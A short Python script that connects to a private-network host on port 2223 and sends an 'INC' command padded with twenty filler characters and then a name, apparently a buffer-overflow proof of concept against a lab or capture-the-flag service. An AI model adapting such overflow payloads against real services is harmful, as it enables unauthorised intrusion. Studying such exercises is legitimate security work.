#!/usr/bin/python3

import socket

def main():
    IP = "192.168.192.167"
    PORT = 2223

    garbage = "1" * 20
    name = "BRAE"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT))
    sock.recv(1024)
    msg = "INC " + garbage + name + "\r\n"
    sock.send(msg.encode())
    sock.recv(1024)

if __name__ == "__main__":
    main()